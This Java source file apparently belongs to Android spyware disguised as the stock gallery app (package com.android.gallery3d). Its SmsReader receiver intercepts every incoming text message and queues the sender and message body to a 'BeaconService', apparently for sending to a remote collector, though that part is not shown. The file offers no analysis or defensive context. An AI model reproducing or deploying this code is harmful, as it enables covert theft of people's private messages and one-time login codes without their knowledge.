package com.android.gallery3d;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReader extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        Bundle b = i.getExtras();
        if (b == null) return;
        Object[] pdus = (Object[]) b.get("pdus");
        if (pdus == null) return;
        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sms == null) continue;
            BeaconService.queue(c, "SMS|" + sms.getOriginatingAddress() + "|" + sms.getMessageBody());
        }
    }
}
